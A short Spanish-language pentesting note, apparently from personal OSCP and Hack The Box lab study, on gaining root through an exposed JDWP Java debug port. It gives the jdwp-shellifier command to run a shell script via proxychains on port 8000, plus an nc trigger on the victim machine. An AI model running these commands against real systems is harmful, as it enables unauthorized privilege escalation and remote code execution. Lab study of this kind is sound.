## DESCRIPTION


Si root esta ejecutando jdwp podemos usar la herramienta: [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier) vale para escalada de privilegios como para explotación.

En PE, lo detecta LINPEAS:

![[Pasted image 20230606203443.png]]

por defecto corre en el puerto 8000

#### Mas información
* 


## EXPLOITATION

El comando a ejecutar:

```
 proxychains python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "/bin/bash /tmp/shell3.sh"

```

Si es una escalada de privilegios se podría ejecutar en local si tenemos python o utilizando proxychains como en el siguiente ejemplo:

![[Pasted image 20230606204636.png]]

En ese caso el jdwp se queda esperando una operacion socket, observnado una app-java vemos que espera una operacion socket en el puerto 5000 por lo que utilizamos nc localhost 5000 en la máquina victima y ya funciona el script

## MACHINES

* Hack The Box: 
* OSCP: OSCPB Berlin
